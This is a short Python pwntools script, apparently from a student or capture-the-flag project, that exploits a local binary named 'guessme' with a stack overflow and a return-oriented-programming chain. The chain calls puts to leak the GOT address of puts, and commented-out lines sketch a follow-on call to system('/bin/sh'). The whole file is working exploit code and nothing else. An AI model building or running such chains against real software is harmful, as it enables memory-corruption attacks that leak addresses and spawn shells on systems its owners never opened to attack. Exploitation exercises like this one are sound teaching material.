#!~/Documents/ICT1-project/venv
from pwn import *
offset = 0x5
context.arch = 'amd64'

elf = ELF("./guessme")
p = elf.process()
rop = ROP(elf)
# rop.call(libc.symbols['system'], [ next(libc.search[b'/bin/sh\x00'])])
# rop.call(lib.symbols['exit'])
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['puts'])
print(p.recvline())
print(p.recvline())
payload = [
    b"A"*offset,
    rop.chain()
]
payload = b"".join(payload)
p.sendline(payload)

p.interactive()
